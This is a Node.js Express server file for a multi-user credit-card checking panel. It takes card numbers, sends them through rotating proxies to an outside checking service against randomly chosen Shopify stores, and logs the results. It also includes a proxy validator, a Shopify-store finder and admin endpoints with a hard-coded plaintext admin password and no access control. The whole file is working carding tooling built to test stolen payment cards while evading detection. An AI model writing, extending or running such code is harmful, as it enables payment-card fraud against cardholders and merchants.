const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ─── GLOBAL MEMORY DATABASE ───
const db = {
  apiKey: '', 
  users: [
    { email: 'yousafcodes.de@gmail.com', pass: 'YOUSAFCODES.DE', role: 'admin', name: 'Oggy Admin', status: 'active' }
  ],
  sites: ['shopify.com', 'checkout.com'],
  proxies: [],
  inbox: [],
  activity: []
};

// ─── PROXY FORMATTER ───
function formatProxy(proxyStr) {
  if (!proxyStr) return null;
  let p = proxyStr.trim();
  if (p.startsWith('http://') || p.startsWith('https://')) return p;
  
  if (p.includes('@')) {
    return `http://${p}`;
  }
  
  const parts = p.split(':');
  if (parts.length === 2) {
    return `http://${parts[0]}:${parts[1]}`;
  }
  return null;
}

// ─── AUTH & USER MANAGEMENT ───
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.users.find(u => u.email === email && u.pass === password && u.status === 'active');
  if (user) res.json({ user: { email: user.email, name: user.name, role: user.role } });
  else res.status(401).json({ error: 'Invalid credentials' });
});

app.get('/api/users', (req, res) => res.json(db.users));
app.post('/api/register', (req, res) => {
  const { email, password, name, role } = req.body;
  if (db.users.find(u => u.email === email)) return res.status(400).json({ error: 'Email exists' });
  db.users.push({ email, pass: password, name, role, status: 'active', checked: 0 });
  res.json({ success: true });
});
app.post('/api/user/status', (req, res) => {
  const user = db.users.find(u => u.email === req.body.email);
  if (user) { user.status = req.body.status; res.json({ success: true }); }
  else res.status(404).json({ error: 'Not found' });
});
app.post('/api/user/delete', (req, res) => {
  db.users = db.users.filter(u => u.email !== req.body.email);
  res.json({ success: true });
});

// ─── ADMIN: SETTINGS ───
app.get('/api/settings', (req, res) => res.json({ apiKey: db.apiKey }));
app.post('/api/settings', (req, res) => {
  db.apiKey = req.body.apiKey || '';
  res.json({ success: true });
});

// ─── ADMIN: SITE CHECKER & MANAGER ───
app.get('/api/sites', (req, res) => res.json(db.sites));

app.post('/api/check-sites', async (req, res) => {
  const { sites } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, live: 0, total: db.sites.length });

  const liveSites = [];
  
  for (let i = 0; i < sites.length; i += 5) {
    const batch = sites.slice(i, i + 5);
    const results = await Promise.all(batch.map(async (s) => {
      let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
      if (!domain) return null;
      
      let proxyStr = null;
      if (db.proxies.length > 0) {
        proxyStr = db.proxies[Math.floor(Math.random() * db.proxies.length)];
      }
      
      const options = { timeout: 15000 };
      if (proxyStr) {
        const formatted = formatProxy(proxyStr);
        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
      }
      
      try {
        // Test 1: Shopify Products JSON (Highly reliable for Shopify)
        const response = await axios.get(`https://${domain}/products.json`, options);
        if (response.status === 200 && response.data && Array.isArray(response.data.products)) {
          console.log(`[Site OK] ${domain} (Shopify JSON)`);
          return domain;
        }
      } catch (err) {
        // Fallback: Test root domain for Shopify headers or CDN links
        try {
          const response = await axios.get(`https://${domain}`, options);
          const headers = response.headers;
          const body = response.data;
          const isShopify = 
            headers['x-shopid'] !== undefined || 
            headers['x-shopify-stage'] !== undefined ||
            (typeof body === 'string' && (body.includes('cdn.shopify.com') || body.includes('Shopify.theme')));
            
          if (response.status === 200 && isShopify) {
            console.log(`[Site OK] ${domain} (Shopify Headers)`);
            return domain;
          }
        } catch (e2) {
          // Dead
        }
        return null;
      }
    }));
    
    results.forEach(r => { if (r) liveSites.push(r); });
  }

  db.sites = [...new Set([...db.sites, ...liveSites])];
  res.json({ success: true, live: liveSites.length, total: db.sites.length });
});

app.delete('/api/sites', (req, res) => {
  const { site } = req.body;
  if (!site) return res.status(400).json({ error: 'Site required' });
  const before = db.sites.length;
  db.sites = db.sites.filter(s => s !== site);
  res.json({ success: true, removed: before - db.sites.length, total: db.sites.length });
});

// ─── ADMIN: PROXY CHECKER & MANAGER ───
app.get('/api/proxies', (req, res) => res.json(db.proxies));

app.post('/api/check-proxies', async (req, res) => {
  const { proxies } = req.body;
  if (!proxies || !proxies.length) return res.json({ success: true, live: 0, total: db.proxies.length });

  const liveProxies = [];
  
  for (let i = 0; i < proxies.length; i += 20) {
    const batch = proxies.slice(i, i + 20);
    const results = await Promise.all(batch.map(async (p) => {
      const start = Date.now();
      const formatted = formatProxy(p);
      if (!formatted) return null;
      
      try {
        const agent = new HttpsProxyAgent(formatted);
        await axios.get('https://api.ipify.org?format=json', { 
          httpsAgent: agent, 
          timeout: 5000 
        });
        
        const ms = Date.now() - start;
        if (ms <= 5000) {
          console.log(`[Proxy OK] ${p} (${ms}ms)`);
          return p;
        }
        return null;
      } catch (err) {
        return null;
      }
    }));
    
    results.forEach(r => { if (r) liveProxies.push(r); });
  }

  db.proxies = [...new Set([...db.proxies, ...liveProxies])];
  res.json({ success: true, live: liveProxies.length, total: db.proxies.length });
});

app.delete('/api/proxies', (req, res) => {
  const { proxy } = req.body;
  if (!proxy) return res.status(400).json({ error: 'Proxy required' });
  const before = db.proxies.length;
  db.proxies = db.proxies.filter(p => p !== proxy);
  res.json({ success: true, removed: before - db.proxies.length, total: db.proxies.length });
});

// ─── MAIN CHECKER ───
app.get('/api/check', async (req, res) => {
  const { cc } = req.query;
  if (!cc) return res.status(400).json({ error: 'Missing CC' });

  let attempts = 0;
  const maxAttempts = db.proxies.length > 0 ? Math.min(3, db.proxies.length) : 1;
  let lastError = 'No proxies available';

  while (attempts < maxAttempts) {
    attempts++;
    
    let proxyStr = null;
    let proxyUrl = null;

    if (db.proxies.length > 0) {
      const idx = Math.floor(Math.random() * db.proxies.length);
      proxyStr = db.proxies[idx];
      proxyUrl = formatProxy(proxyStr);
    }

    const site = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : 'shopify.com';
    const targetUrl = new URL('https://check.yzio.app/shopify');
    
    targetUrl.searchParams.append('site', site);
    targetUrl.searchParams.append('cc', cc);
    
    if (db.apiKey && db.apiKey.trim() !== '') {
      targetUrl.searchParams.append('key', db.apiKey.trim());
    }
    if (proxyStr) {
      targetUrl.searchParams.append('proxy', proxyStr);
    }

    try {
      const options = { timeout: 20000 };
      if (proxyUrl) options.httpsAgent = new HttpsProxyAgent(proxyUrl);
      
      const response = await axios.get(targetUrl.toString(), options);
      return res.json(response.data);

    } catch (err) {
      lastError = err.message;
      
      if (proxyStr && (err.code === 'ECONNABORTED' || err.code === 'ETIMEDOUT' || err.message.includes('connect') || err.message.includes('ECONNREFUSED'))) {
        db.proxies = db.proxies.filter(p => p !== proxyStr);
        console.log(`[Proxy Dead] Removed ${proxyStr} - Retrying...`);
      }
    }
  }

  res.status(500).json({ 
    status: 'ERROR', 
    message: `Failed after ${attempts} attempts. ${lastError}` 
  });
});

// ─── REPORTING & INBOX ───
app.post('/api/report', (req, res) => {
  const { user, cc, message } = req.body;
  db.inbox.unshift({ user, cc, message, time: new Date().toISOString() });
  res.json({ success: true });
});

app.post('/api/activity', (req, res) => {
  const { user, card, result } = req.body;
  db.activity.unshift({ user, action: 'check', card, result, time: new Date().toISOString() });
  if (db.activity.length > 500) db.activity.pop();
  const u = db.users.find(x => x.email === user);
  if (u) u.checked = (u.checked || 0) + 1;
  res.json({ success: true });
});

app.get('/api/admin/data', (req, res) => {
  res.json({ inbox: db.inbox, activity: db.activity });
});

// ─── SERVE FRONTEND ───
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
